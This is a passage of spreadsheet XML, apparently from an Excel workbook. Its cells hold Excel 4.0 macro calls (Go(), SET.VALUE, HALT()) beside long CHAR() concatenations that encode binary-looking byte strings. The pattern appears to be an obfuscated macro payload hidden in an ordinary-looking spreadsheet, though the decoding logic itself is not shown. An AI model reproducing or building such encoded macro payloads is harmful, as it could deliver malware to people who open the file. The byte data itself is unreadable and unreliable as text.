7)&amp;CHAR(9)&amp;CHAR(155)&amp;CHAR(97)&amp;CHAR(84)&amp;CHAR(171)&amp;CHAR(252)&amp;CHAR(97)&amp;CHAR(217)&amp;CHAR(71)&amp;CHAR(33)&amp;CHAR(237)&amp;CHAR(203)&amp;CHAR(107)&amp;CHAR(135)&amp;CHAR(196)&amp;CHAR(228)&amp;CHAR(150)&amp;CHAR(25)&amp;CHAR(116)&amp;CHAR(74)&amp;CHAR(209)&amp;CHAR(69)&amp;CHAR(121)&amp;CHAR(223)&amp;CHAR(141)&amp;CHAR(95)&amp;CHAR(179)&amp;CHAR(80)&amp;CHAR(169)&amp;CHAR(163)&amp;CHAR(196)&amp;CHAR(53)&amp;CHAR(35)&amp;CHAR(64)&amp;CHAR(6)&amp;CHAR(221)&amp;CHAR(140)&amp;CHAR(224)&amp;CHAR(107)&amp;CHAR(213)&amp;CHAR(222)&amp;CHAR(247)&amp;CHAR(10)&amp;CHAR(181)&amp;CHAR(13)&amp;CHAR(69)&amp;CHAR(105)</f>
        <v>À³_x0008_=š2ÞÐÂbaœ–Ézÿ°Ý~~k€Dpœìxm€÷Ý°nx JmÆt£Çg_x001F_ïü0B(_x001E_!5_x0016_ä Á„_x000D_|ÕôT)&lt;žÑÓ©Ž2Öw_x0012_|Èöi5k‚„À±_x000E_Ì©_x0015_r_x0008_ð°â¿e_x001D_4_x001B_A;7_x0014_š*&lt;÷ßG_x001E_©ÅŽ€)/;ì_x0015__x0016_ž²¶”Ö"û¶…Hñ©`(gÔÜŽ[u~b^$÷u"œ_x0002__x001D_ÄL\Öðb·?Îó_x0013_Ü¬3´_x001E__x0003_Ñ§Ú]_x0005_íC˜Š¦È¬Œ.8_x0002_(‘•fQ÷aHmüìý%žô_x0006__x0013_ŒÃQmAÀþk	›aT«üaÙG!íËk‡Ää–_x0019_tJÑEyß_³P©£Ä5#@_x0006_ÝŒàkÕÞ÷
µ_x000D_Ei</v>
      </c>
      <c r="C38" t="str">
        <f>CHAR(191)&amp;CHAR(118)&amp;CHAR(192)&amp;CHAR(19)&amp;CHAR(229)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(191)&amp;CHAR(126)</f>
        <v>¿vÀ_x0013_åë»ë¿~</v>
      </c>
    </row>
    <row r="39" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A39" t="e">
        <f>Go()</f>
        <v>#NAME?</v>
      </c>
      <c r="B39" t="str">
        <f>CHAR(137)&amp;CHAR(191)&amp;CHAR(185)&amp;CHAR(185)&amp;CHAR(148)&amp;CHAR(32)&amp;CHAR(15)&amp;CHAR(249)&amp;CHAR(50)&amp;CHAR(231)&amp;CHAR(171)&amp;CHAR(73)&amp;CHAR(14)&amp;CHAR(15)&amp;CHAR(171)&amp;CHAR(99)&amp;CHAR(46)&amp;CHAR(55)&amp;CHAR(46)&amp;CHAR(182)&amp;CHAR(200)&amp;CHAR(99)&amp;CHAR(133)&amp;CHAR(4)&amp;CHAR(15)&amp;CHAR(81)&amp;CHAR(142)&amp;CHAR(145)&amp;CHAR(30)&amp;CHAR(26)&amp;CHAR(151)&amp;CHAR(251)&amp;CHAR(177)&amp;CHAR(171)&amp;CHAR(227)&amp;CHAR(210)&amp;CHAR(252)&amp;CHAR(195)&amp;CHAR(18)&amp;CHAR(53)&amp;CHAR(167)&amp;CHAR(59)&amp;CHAR(85)&amp;CHAR(217)&amp;CHAR(30)&amp;CHAR(2)&amp;CHAR(190)&amp;CHAR(47)&amp;CHAR(141)&amp;CHAR(165)&amp;CHAR(185)&amp;CHAR(31)&amp;CHAR(233)&amp;CHAR(22)&amp;CHAR(179)&amp;CHAR(164)&amp;CHAR(149)&amp;CHAR(227)&amp;CHAR(40)&amp;CHAR(214)&amp;CHAR(33)&amp;CHAR(8)&amp;CHAR(225)&amp;CHAR(116)&amp;CHAR(194)&amp;CHAR(167)&amp;CHAR(157)&amp;CHAR(54)&amp;CHAR(111)&amp;CHAR(196)&amp;CHAR(97)&amp;CHAR(147)&amp;CHAR(170)&amp;CHAR(135)&amp;CHAR(203)&amp;CHAR(152)&amp;CHAR(215)&amp;CHAR(67)&amp;CHAR(14)&amp;CHAR(54)&amp;CHAR(106)&amp;CHAR(170)&amp;CHAR(21)&amp;CHAR(161)&amp;CHAR(157)&amp;CHAR(234)&amp;CHAR(222)&amp;CHAR(119)&amp;CHAR(23)&amp;CHAR(18)&amp;CHAR(18)&amp;CHAR(207)&amp;CHAR(19)&amp;CHAR(73)&amp;CHAR(130)&amp;CHAR(180)&amp;CHAR(127)&amp;CHAR(124)&amp;CHAR(130)&amp;CHAR(189)&amp;CHAR(183)&amp;CHAR(14)&amp;CHAR(132)&amp;CHAR(174)&amp;CHAR(244)&amp;CHAR(181)&amp;CHAR(51)&amp;CHAR(146)&amp;CHAR(73)&amp;CHAR(72)&amp;CHAR(120)&amp;CHAR(122)&amp;CHAR(97)&amp;CHAR(155)&amp;CHAR(63)&amp;CHAR(164)&amp;CHAR(171)&amp;CHAR(28)&amp;CHAR(125)&amp;CHAR(62)&amp;CHAR(100)&amp;CHAR(123)&amp;CHAR(240)&amp;CHAR(120)&amp;CHAR(97)&amp;CHAR(184)&amp;CHAR(192)&amp;CHAR(238)&amp;CHAR(202)&amp;CHAR(144)&amp;CHAR(163)&amp;CHAR(113)&amp;CHAR(215)&amp;CHAR(72)&amp;CHAR(11)&amp;CHAR(22)&amp;CHAR(81)&amp;CHAR(185)&amp;CHAR(17)&amp;CHAR(79)&amp;CHAR(241)&amp;CHAR(177)&amp;CHAR(213)&amp;CHAR(7)&amp;CHAR(126)&amp;CHAR(187)&amp;CHAR(222)&amp;CHAR(28)&amp;CHAR(207)&amp;CHAR(115)&amp;CHAR(82)&amp;CHAR(61)&amp;CHAR(199)&amp;CHAR(230)&amp;CHAR(20)&amp;CHAR(12)&amp;CHAR(63)&amp;CHAR(82)&amp;CHAR(119)&amp;CHAR(69)&amp;CHAR(95)&amp;CHAR(201)&amp;CHAR(6)&amp;CHAR(17)&amp;CHAR(168)&amp;CHAR(119)&amp;CHAR(202)&amp;CHAR(235)&amp;CHAR(132)&amp;CHAR(226)&amp;CHAR(225)&amp;CHAR(203)&amp;CHAR(142)&amp;CHAR(63)&amp;CHAR(253)&amp;CHAR(167)&amp;CHAR(92)&amp;CHAR(222)&amp;CHAR(134)&amp;CHAR(59)&amp;CHAR(225)&amp;CHAR(19)&amp;CHAR(247)&amp;CHAR(93)&amp;CHAR(162)&amp;CHAR(202)&amp;CHAR(213)&amp;CHAR(169)&amp;CHAR(241)&amp;CHAR(94)&amp;CHAR(127)&amp;CHAR(68)&amp;CHAR(74)&amp;CHAR(3)&amp;CHAR(96)&amp;CHAR(133)&amp;CHAR(114)&amp;CHAR(91)&amp;CHAR(4)&amp;CHAR(207)&amp;CHAR(127)&amp;CHAR(108)&amp;CHAR(225)&amp;CHAR(69)&amp;CHAR(8)&amp;CHAR(72)&amp;CHAR(202)&amp;CHAR(107)&amp;CHAR(170)&amp;CHAR(159)&amp;CHAR(8)&amp;CHAR(15)&amp;CHAR(107)&amp;CHAR(157)&amp;CHAR(195)&amp;CHAR(168)&amp;CHAR(29)&amp;CHAR(25)&amp;CHAR(191)&amp;CHAR(105)&amp;CHAR(126)&amp;CHAR(126)&amp;CHAR(137)&amp;CHAR(179)&amp;CHAR(255)&amp;CHAR(62)&amp;CHAR(153)&amp;CHAR(179)&amp;CHAR(111)&amp;CHAR(33)&amp;CHAR(176)&amp;CHAR(177)&amp;CHAR(145)&amp;CHAR(48)&amp;CHAR(154)&amp;CHAR(47)&amp;CHAR(15)&amp;CHAR(12)&amp;CHAR(127)&amp;CHAR(209)&amp;CHAR(36)&amp;CHAR(149)&amp;CHAR(208)&amp;CHAR(230)&amp;CHAR(149)&amp;CHAR(200)&amp;CHAR(54)&amp;CHAR(221)&amp;CHAR(116)&amp;CHAR(130)&amp;CHAR(25)&amp;CHAR(136)&amp;CHAR(219)&amp;CHAR(216)&amp;CHAR(68)</f>
        <v>‰¿¹¹” _x000F_ù2ç«I_x000E__x000F_«c.7.¶Èc…_x0004__x000F_QŽ‘_x001E__x001A_—û±«ãÒüÃ_x0012_5§;UÙ_x001E__x0002_¾/¥¹_x001F_é_x0016_³¤•ã(Ö!_x0008_átÂ§6oÄa“ª‡Ë˜×C_x000E_6jª_x0015_¡êÞw_x0017__x0012__x0012_Ï_x0013_I‚´|‚½·_x000E_„®ôµ3’IHxza›?¤«_x001C_}&gt;d{ðxa¸ÀîÊ£q×H_x000B__x0016_Q¹_x0011_Oñ±Õ_x0007_~»Þ_x001C_ÏsR=Çæ_x0014__x000C_?RwE_É_x0006__x0011_¨wÊë„âáËŽ?ý§\Þ†;á_x0013_÷]¢ÊÕ©ñ^DJ_x0003_`…r[_x0004_ÏláE_x0008_HÊkªŸ_x0008__x000F_kÃ¨_x001D__x0019_¿i~~‰³ÿ&gt;™³o!°±‘0š/_x000F__x000C_Ñ$•Ðæ•È6Ýt‚_x0019_ˆÛØD</v>
      </c>
      <c r="C39" t="str">
        <f>CHAR(50)&amp;CHAR(126)&amp;CHAR(132)&amp;CHAR(98)&amp;CHAR(75)&amp;CHAR(163)&amp;CHAR(122)&amp;CHAR(232)&amp;CHAR(173)&amp;CHAR(48)</f>
        <v>2~„bK£zè­0</v>
      </c>
    </row>
    <row r="40" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A40" t="b">
        <f>SET.VALUE(A21,0)</f>
        <v>0</v>
      </c>
      <c r="B40" t="str">
        <f>CHAR(192)&amp;CHAR(10)&amp;CHAR(186)&amp;CHAR(174)&amp;CHAR(113)&amp;CHAR(21)&amp;CHAR(36)&amp;CHAR(69)&amp;CHAR(136)&amp;CHAR(255)&amp;CHAR(224)&amp;CHAR(1)&amp;CHAR(163)&amp;CHAR(159)&amp;CHAR(109)&amp;CHAR(206)&amp;CHAR(244)&amp;CHAR(52)&amp;CHAR(16)&amp;CHAR(246)&amp;CHAR(21)&amp;CHAR(229)&amp;CHAR(247)&amp;CHAR(95)&amp;CHAR(27)&amp;CHAR(176)&amp;CHAR(185)&amp;CHAR(81)&amp;CHAR(221)&amp;CHAR(171)&amp;CHAR(237)&amp;CHAR(65)&amp;CHAR(9)&amp;CHAR(155)&amp;CHAR(226)&amp;CHAR(177)&amp;CHAR(125)&amp;CHAR(3)&amp;CHAR(18)&amp;CHAR(144)&amp;CHAR(48)&amp;CHAR(142)&amp;CHAR(83)&amp;CHAR(81)&amp;CHAR(122)&amp;CHAR(67)&amp;CHAR(121)&amp;CHAR(80)&amp;CHAR(143)&amp;CHAR(150)&amp;CHAR(236)&amp;CHAR(179)&amp;CHAR(141)&amp;CHAR(167)&amp;CHAR(131)&amp;CHAR(221)&amp;CHAR(155)&amp;CHAR(10)&amp;CHAR(95)&amp;CHAR(75)&amp;CHAR(59)&amp;CHAR(254)&amp;CHAR(204)&amp;CHAR(52)&amp;CHAR(59)&amp;CHAR(129)&amp;CHAR(158)&amp;CHAR(104)&amp;CHAR(204)&amp;CHAR(22)&amp;CHAR(104)&amp;CHAR(120)&amp;CHAR(12)&amp;CHAR(255)&amp;CHAR(232)&amp;CHAR(156)&amp;CHAR(170)&amp;CHAR(242)&amp;CHAR(88)&amp;CHAR(89)&amp;CHAR(134)&amp;CHAR(52)&amp;CHAR(147)&amp;CHAR(76)&amp;CHAR(79)&amp;CHAR(236)&amp;CHAR(171)&amp;CHAR(179)&amp;CHAR(157)&amp;CHAR(65)&amp;CHAR(51)&amp;CHAR(245)&amp;CHAR(121)&amp;CHAR(139)&amp;CHAR(222)&amp;CHAR(82)&amp;CHAR(41)&amp;CHAR(51)&amp;CHAR(56)&amp;CHAR(8)&amp;CHAR(68)&amp;CHAR(4)&amp;CHAR(93)&amp;CHAR(215)&amp;CHAR(130)&amp;CHAR(48)&amp;CHAR(124)&amp;CHAR(15)&amp;CHAR(207)&amp;CHAR(132)&amp;CHAR(200)&amp;CHAR(243)&amp;CHAR(160)&amp;CHAR(179)&amp;CHAR(117)&amp;CHAR(107)&amp;CHAR(34)&amp;CHAR(104)&amp;CHAR(139)&amp;CHAR(223)&amp;CHAR(168)&amp;CHAR(118)&amp;CHAR(165)&amp;CHAR(231)&amp;CHAR(37)&amp;CHAR(239)&amp;CHAR(142)&amp;CHAR(182)&amp;CHAR(207)&amp;CHAR(2)&amp;CHAR(51)&amp;CHAR(190)&amp;CHAR(64)&amp;CHAR(189)&amp;CHAR(152)&amp;CHAR(8)&amp;CHAR(241)&amp;CHAR(73)&amp;CHAR(149)&amp;CHAR(173)&amp;CHAR(107)&amp;CHAR(237)&amp;CHAR(18)&amp;CHAR(108)&amp;CHAR(217)&amp;CHAR(158)&amp;CHAR(222)&amp;CHAR(19)&amp;CHAR(39)&amp;CHAR(144)&amp;CHAR(220)&amp;CHAR(63)&amp;CHAR(212)&amp;CHAR(192)&amp;CHAR(30)&amp;CHAR(191)&amp;CHAR(38)&amp;CHAR(64)&amp;CHAR(178)&amp;CHAR(176)&amp;CHAR(30)&amp;CHAR(219)&amp;CHAR(2)&amp;CHAR(30)&amp;CHAR(28)&amp;CHAR(127)&amp;CHAR(181)&amp;CHAR(72)&amp;CHAR(79)&amp;CHAR(153)&amp;CHAR(137)&amp;CHAR(233)&amp;CHAR(108)&amp;CHAR(219)&amp;CHAR(203)&amp;CHAR(37)&amp;CHAR(70)&amp;CHAR(116)&amp;CHAR(180)&amp;CHAR(35)&amp;CHAR(57)&amp;CHAR(234)&amp;CHAR(30)&amp;CHAR(14)&amp;CHAR(62)&amp;CHAR(168)&amp;CHAR(103)&amp;CHAR(107)&amp;CHAR(187)&amp;CHAR(213)&amp;CHAR(151)&amp;CHAR(247)&amp;CHAR(249)&amp;CHAR(214)&amp;CHAR(102)&amp;CHAR(104)&amp;CHAR(13)&amp;CHAR(80)&amp;CHAR(36)&amp;CHAR(78)&amp;CHAR(236)&amp;CHAR(133)&amp;CHAR(38)&amp;CHAR(17)&amp;CHAR(100)&amp;CHAR(5)&amp;CHAR(122)&amp;CHAR(132)&amp;CHAR(118)&amp;CHAR(227)&amp;CHAR(101)&amp;CHAR(1)&amp;CHAR(12)&amp;CHAR(242)&amp;CHAR(62)&amp;CHAR(52)&amp;CHAR(252)&amp;CHAR(197)&amp;CHAR(173)&amp;CHAR(251)&amp;CHAR(59)&amp;CHAR(22)&amp;CHAR(23)&amp;CHAR(172)&amp;CHAR(40)&amp;CHAR(203)&amp;CHAR(149)&amp;CHAR(120)&amp;CHAR(50)&amp;CHAR(6)&amp;CHAR(151)&amp;CHAR(57)&amp;CHAR(14)&amp;CHAR(207)&amp;CHAR(97)&amp;CHAR(197)&amp;CHAR(117)&amp;CHAR(167)&amp;CHAR(71)&amp;CHAR(87)&amp;CHAR(109)&amp;CHAR(141)&amp;CHAR(201)&amp;CHAR(208)&amp;CHAR(161)&amp;CHAR(102)&amp;CHAR(85)&amp;CHAR(9)&amp;CHAR(125)&amp;CHAR(80)&amp;CHAR(254)&amp;CHAR(247)&amp;CHAR(158)&amp;CHAR(23)&amp;CHAR(231)</f>
        <v>À
º®q_x0015_$Eˆÿà_x0001_£ŸmÎô4_x0010_ö_x0015_å÷__x001B_°¹QÝ«íA	›â±}_x0003__x0012_0ŽSQzCyP–ì³§ƒÝ›
_K;þÌ4;žhÌ_x0016_hx_x000C_ÿèœªòXY†4“LOì«³A3õy‹ÞR)38_x0008_D_x0004_]×‚0|_x000F_Ï„Èó ³uk"h‹ß¨v¥ç%ïŽ¶Ï_x0002_3¾@½˜_x0008_ñI•­kí_x0012_lÙžÞ_x0013_'Ü?ÔÀ_x001E_¿&amp;@²°_x001E_Û_x0002__x001E__x001C_µHO™‰élÛË%Ft´#9ê_x001E__x000E_&gt;¨gk»Õ—÷ùÖfh_x000D_P$Nì…&amp;_x0011_d_x0005_z„vãe_x0001__x000C_ò&gt;4üÅ­û;_x0016__x0017_¬(Ë•x2_x0006_—9_x000E_ÏaÅu§GWmÉÐ¡fU	}Pþ÷ž_x0017_ç</v>
      </c>
      <c r="C40" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(243)&amp;CHAR(102)&amp;CHAR(250)&amp;CHAR(8)&amp;CHAR(241)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(3)</f>
        <v>Íëófú_x0008_ñ6Í_x0003_</v>
      </c>
    </row>
    <row r="41" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A41" t="b">
        <f>HALT()</f>
        <v>0</v>
      </c>
      <c r="B41" t="str">
        <f>CHAR(121)&amp;CHAR(110)&amp;CHAR(110)&amp;CHAR(67)&amp;CHAR(21)&amp;CHAR(41)&amp;CHAR(48)&amp;CHAR(206)&amp;CHAR(251)&amp;CHAR(73)&amp;CHAR(42)&amp;CHAR(114)&amp;CHAR(55)&amp;CHAR(214)&amp;CHAR(226)&amp;CHAR(100)&amp;CHAR(179)&amp;CHAR(183)&amp;CHAR(3)&amp;CHAR(34)&amp;CHAR(193)&amp;CHAR(195)&amp;CHAR(124)&amp;CHAR(244)&amp;CHAR(188)&amp;CHAR(69)&amp;CHAR(183)&amp;CHAR(23)&amp;CHAR(143)&amp;CHAR(56)&amp;CHAR(239)&amp;CHAR(216)&amp;CHAR(139)&amp;CHAR(84)&amp;CHAR(3)&amp;CHAR(212)&amp;CHAR(141)&amp;CHAR(128)&amp;CHAR(87)&amp;CHAR(175)&amp;CHAR(10)&amp;CHAR(36)&amp;CHAR(111)&amp;CHAR(227)&amp;CHAR(102)&amp;CHAR(186)&amp;CHAR(27)&amp;CHAR(185)&amp;CHAR(180)&amp;CHAR(88)&amp;CHAR(11)&amp;CHAR(119)&amp;CHAR(52)&amp;CHAR(162)&amp;CHAR(40)&amp;CHAR(201)&amp;CHAR(157)&amp;CHAR(63)&amp;CHAR(182)&amp;CHAR(26)&amp;CHAR(11)&amp;CHAR(28)&amp;CHAR(103)&amp;CHAR(13)&amp;CHAR(242)&amp;CHAR(11)&amp;CHAR(188)&amp;CHAR(70)&amp;CHAR(133)&amp;CHAR(164)&amp;CHAR(158)&amp;CHAR(21)&amp;CHAR(44)&amp;CHAR(120)&amp;CHAR(197)&amp;CHAR(120)&amp;CHAR(27)&amp;CHAR(108)&amp;CHAR(244)&amp;CHAR(149)&amp;CHAR(126)&amp;CHAR(164)&amp;CHAR(13)&amp;CHAR(253)&amp;CHAR(214)&amp;CHAR(217)&amp;CHAR(110)&amp;CHAR(248)&amp;CHAR(29)&amp;CHAR(72)&amp;CHAR(117)&amp;CHAR(19)&amp;CHAR(191)&amp;CHAR(23)&amp;CHAR(169)&amp;CHAR(187)&amp;CHAR(84)&amp;CHAR(243)&amp;CHAR(131)&amp;CHAR(39)&amp;CHAR(219)&amp;CHAR(240)&amp;CHAR(214)&amp;CHAR(167)&amp;CHAR(53)&amp;CHAR(171)&amp;CHAR(116)&amp;CHAR(92)&amp;CHAR(154)&amp;CHAR(12)&amp;CHAR(227)&amp;CHAR(130)&amp;CHAR(221)&amp;CHAR(52)&amp;CHAR(148)&amp;CHAR(252)&amp;CHAR(104)&amp;CHAR(242)&amp;CHAR(150)&amp;CHAR(102)&amp;CHAR(13)&amp;CHAR(251)&amp;CHAR(90)&amp;CHAR(161)&amp;CHAR(37)&amp;CHAR(55)&amp;CHAR(140)&amp;CHAR(77)&amp;CHAR(188)&amp;CHAR(187)&amp;CHAR(33)&amp;CHAR(239)&amp;CHAR(229)&amp;CHAR(67)&amp;CHAR(66)&amp;CHAR(39)&amp;CHAR(174)&amp;CHAR(102)&amp;CHAR(224)&amp;CHAR(232)&amp;CHAR(120)&amp;CHAR(46)&amp;CHAR(236)&amp;CHAR(236)&amp;CHAR(55)&amp;CHAR(10)&amp;CHAR(80)&amp;CHAR(218)&amp;CHAR(121)&amp;CHAR(78)&amp;CHAR(30)&amp;CHAR(140)&amp;CHAR(234)&amp;CHAR(3)&amp;CHAR(104)&amp;CHAR(181)&amp;CHAR(129)&amp;CHAR(53)&amp;CHAR(147)&amp;CHAR(96)&amp;CHAR(230)&amp;CHAR(247)&amp;CHAR(68)&amp;CHAR(56)&amp;CHAR(108)&amp;CHAR(15)&amp;CHAR(158)&amp;CHAR(173)&amp;CHAR(68)&amp;CHAR(68)&amp;CHAR(187)&amp;CHAR(200)&amp;CHAR(122)&amp;CHAR(11)&amp;CHAR(220)&amp;CHAR(38)&amp;CHAR(171)&amp;CHAR(21)&amp;CHAR(167)&amp;CHAR(77)&amp;CHAR(10)&amp;CHAR(101)&amp;CHAR(6)&amp;CHAR(150)&amp;CHAR(151)&amp;CHAR(169)&amp;CHAR(86)&amp;CHAR(213)&amp;CHAR(124)&amp;CHAR(20)&amp;CHAR(62)&amp;CHAR(241)&amp;CHAR(10)&amp;CHAR(248)&amp;CHAR(227)&amp;CHAR(9)&amp;CHAR(63)&amp;CHAR(137)&amp;CHAR(193)&amp;CHAR(226)&amp;CHAR(53)&amp;CHAR(196)&amp;CHAR(105)&amp;CHAR(39)&amp;CHAR(111)&amp;CHAR(19)&amp;CHAR(174)&amp;CHAR(105)&amp;CHAR(7)&amp;CHAR(249)&amp;CHAR(178)&amp;CHAR(104)&amp;CHAR(151)&amp;CHAR(152)&amp;CHAR(34)&amp;CHAR(8)&amp;CHAR(120)&amp;CHAR(77)&amp;CHAR(247)&amp;CHAR(190)&amp;CHAR(58)&amp;CHAR(80)&amp;CHAR(140)&amp;CHAR(191)&amp;CHAR(132)&amp;CHAR(254)&amp;CHAR(194)&amp;CHAR(196)&amp;CHAR(135)&amp;CHAR(116)&amp;CHAR(12)&amp;CHAR(18)&amp;CHAR(255)&amp;CHAR(20)&amp;CHAR(113)&amp;CHAR(142)&amp;CHAR(213)&amp;CHAR(254)&amp;CHAR(189)&amp;CHAR(4)&amp;CHAR(63)&amp;CHAR(44)&amp;CHAR(253)&amp;CHAR(150)&amp;CHAR(153)&amp;CHAR(53)&amp;CHAR(150)&amp;CHAR(237)&amp;CHAR(177)&amp;CHAR(144)&amp;CHAR(208)&amp;CHAR(198)&amp;CHAR(199)&amp;CHAR(60)&amp;CHAR(224)</f>
        <v>ynnC_x0015_)0ÎûI*r7Öâd³·_x0003_"ÁÃ|ô¼E·_x0017_8ïØ‹T_x0003_Ô€W¯
$oãfº_x001B_¹´X_x000B_w4¢(É?¶_x001A__x000B__x001C_g_x000D_ò_x000B_¼F…¤ž_x0015_,xÅx_x001B_lô•~¤_x000D_ýÖÙnø_x001D_Hu_x0013_¿_x0017_©»Tóƒ'ÛðÖ§5«t\š_x000C_ã‚Ý4”ühò–f_x000D_ûZ¡%7ŒM¼»!ïåCB'®fàèx.ìì7
PÚyN_x001E_Œê_x0003_hµ5“`æ÷D8l_x000F_ž­DD»Èz_x000B_Ü&amp;«_x0015_§M
e_x0006_–—©VÕ|_x0014_&gt;ñ
øã	?‰Áâ5Äi'o_x0013_®i_x0007_ù²h—˜"_x0008_xM÷¾:PŒ¿„þÂÄ‡t_x000C__x0012_ÿ_x0014_qŽÕþ½_x0004_?,ý–™5–í±ÐÆÇ&lt;à</v>
      </c>
      <c r="C41" t="str">
        <f>CHAR(9)&amp;CHAR(232)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(145)&amp;CHAR(122)&amp;CHAR(70)&amp;CHAR(239)&amp;CHAR(158)&amp;CHAR(195)</f>
        <v xml:space="preserve">	è÷ý‘zFïžÃ</v>
      </c>
    </row>
    <row r="42" spans="1:3" x14ac:dyDescent="0.25">
      <c r="B42" t="str">
        <f>CHAR(144)&amp;CHAR(62)&amp;CHAR(34)&amp;CHAR(132)&amp;CHAR(44)&amp;CHAR(117)&amp;CHAR(109)&amp;CHAR(191)&amp;CHAR(72)&amp;CHAR(6)&amp;CHAR(20)&amp;CHAR(86)&amp;CHAR(61)&amp;CHAR(212)&amp;CHAR(189)&amp;CHAR(14)&amp;CHAR(152)&amp;CHAR(160)&amp;CHAR(18)&amp;CHAR(138)&amp;CHAR(101)&amp;CHAR(226)&amp;CHAR(193)&amp;CHAR(104)&amp;CHAR(51)&amp;CHAR(65)&amp;CHAR(227)&amp;CHAR(219)&amp;CHAR(55)&amp;CHAR(66)&amp;CHAR(25)&amp;CHAR(13)&amp;CHAR(71)&amp;CHAR(53)&amp;CHAR(120)&amp;CHAR(27)&amp;CHAR(102)&amp;CHAR(163)&amp;CHAR(96)&amp;CHAR(193)&amp;CHAR(196)&amp;CHAR(129)&amp;CHAR(37)&amp;CHAR(44)&amp;CHAR(237)&amp;CHAR(39)&amp;CHAR(16)&amp;CHAR(157)&amp;CHAR(246)&amp;CHAR(7)&amp;CHAR(197)&amp;CHAR(208)&amp;CHAR(241)&amp;CHAR(232)&amp;CHAR(170)&amp;CHAR(35)&amp;CHAR(213)&amp;CHAR(23)&amp;CHAR(85)&amp;CHAR(55)&amp;CHAR(106)&amp;CHAR(171)&amp;CHAR(232)&amp;CHAR(53)&amp;CHAR(135)&amp;CHAR(13)&amp;CHAR(1)&amp;CHAR(222)&amp;CHAR(145)&amp;CHAR(100)&amp;CHAR(80)&amp;CHAR(189)&amp;CHAR(228)&amp;CHAR(118)&amp;CHAR(217)&amp;CHAR(114)&amp;CHAR(62)&amp;CHAR(203)&amp;CHAR(60)&amp;CHAR(45)&amp;CHAR(61)&amp;CHAR(140)&amp;CHAR(85)&amp;CHAR(182)&amp;CHAR(142)&amp;CHAR(165)&amp;CHAR(30)&amp;CHAR(134)&amp;CHAR(177)&amp;CHAR(236)&amp;CHAR(35)&amp;CHAR(75)&amp;CHAR(159)&amp;CHAR(156)&amp;CHAR(113)&amp;CHAR(83)&amp;CHAR(241)&amp;CHAR(112)&amp;CHAR(32)&amp;CHAR(137)&amp;CHAR(34)&amp;CHAR(200)&amp;CHAR(220)&amp;CHAR(8)&amp;CHAR(6)&amp;CHAR(225)&amp;CHAR(69)&amp;CHAR(47)&amp;CHAR(84)&amp;CHAR(138)&amp;CHAR(109)&amp;CHAR(152)&amp;CHAR(197)&amp;CHAR(253)&amp;CHAR(217)&amp;CHAR(144)&amp;CHAR(125)&amp;CHAR(50)&amp;CHAR(175)&amp;CHAR(13)&amp;CHAR(90)&amp;CHAR(99)&amp;CHAR(29)&amp;CHAR(238)&amp;CHAR(52)&amp;CHAR(193)&amp;CHAR(222)&amp;CHAR(103)&amp;CHAR(31)&amp;CHAR(193)&amp;CHAR(46)&amp;CHAR(70)&amp;CHAR(203)&amp;CHAR(31)&amp;CHAR(82)&amp;CHAR(240)&amp;CHAR(202)&amp;CHAR(37)&amp;CHAR(169)&amp;CHAR(197)&amp;CHAR(217)&amp;CHAR(19)&amp;CHAR(142)&amp;CHAR(115)&amp;CHAR(14)&amp;CHAR(252)&amp;CHAR(70)&amp;CHAR(33)&amp;CHAR(223)&amp;CHAR(209)&amp;CHAR(60)&amp;CHAR(39)&amp;CHAR(51)&amp;CHAR(87)&amp;CHAR(76)&amp;CHAR(64)&amp;CHAR(220)&amp;CHAR(172)&amp;CHAR(19)&amp;CHAR(77)&amp;CHAR(227)&amp;CHAR(209)&amp;CHAR(178)&amp;CHAR(1)&amp;CHAR(168)&amp;CHAR(13)&amp;CHAR(239)&amp;CHAR(77)&amp;CHAR(33)&amp;CHAR(112)&amp;CHAR(248)&amp;CHAR(156)&amp;CHAR(98)&amp;CHAR(167)&amp;CHAR(242)&amp;CHAR(185)&amp;CHAR(175)&amp;CHAR(232)&amp;CHAR(137)&amp;CHAR(202)&amp;CHAR(106)&amp;CHAR(6)&amp;CHAR(173)&amp;CHAR(138)&amp;CHAR(17)&amp;CHAR(2)&amp;CHAR(136)&amp;CHAR(51)&amp;CHAR(244)&amp;CHAR(32)&amp;CHAR(93)&amp;CHAR(90)&amp;CHAR(124)&amp;CHAR(81)&amp;CHAR(84)&amp;CHAR(186)&amp;CHAR(127)&amp;CHAR(7)&amp;CHAR(69)&amp;CHAR(82)&amp;CHAR(23)&amp;CHAR(1)&amp;CHAR(108)&amp;CHAR(173)&amp;CHAR(104)&amp;CHAR(179)&amp;CHAR(192)&amp;CHAR(98)&amp;CHAR(134)&amp;CHAR(248)&amp;CHAR(192)&amp;CHAR(157)&amp;CHAR(11)&amp;CHAR(197)&amp;CHAR(85)&amp;CHAR(96)&amp;CHAR(19)&amp;CHAR(216)&amp;CHAR(171)&amp;CHAR(50)&amp;CHAR(238)&amp;CHAR(117)&amp;CHAR(19)&amp;CHAR(216)&amp;CHAR(122)&amp;CHAR(197)&amp;CHAR(128)&amp;CHAR(93)&amp;CHAR(253)&amp;CHAR(178)&amp;CHAR(109)&amp;CHAR(208)&amp;CHAR(140)&amp;CHAR(63)&amp;CHAR(233)&amp;CHAR(244)&amp;CHAR(13)&amp;CHAR(235)&amp;CHAR(125)&amp;CHAR(120)&amp;CHAR(57)&amp;CHAR(139)&amp;CHAR(28)&amp;CHAR(5)&amp;CHAR(246)&amp;CHAR(73)&amp;CHAR(222)&amp;CHAR(250)&amp;CHAR(138)&amp;CHAR(153)&amp;CHAR(159)&amp;CHAR(246)&amp;CHAR(241)&amp;CHAR(135)&amp;CHAR(18)</f>
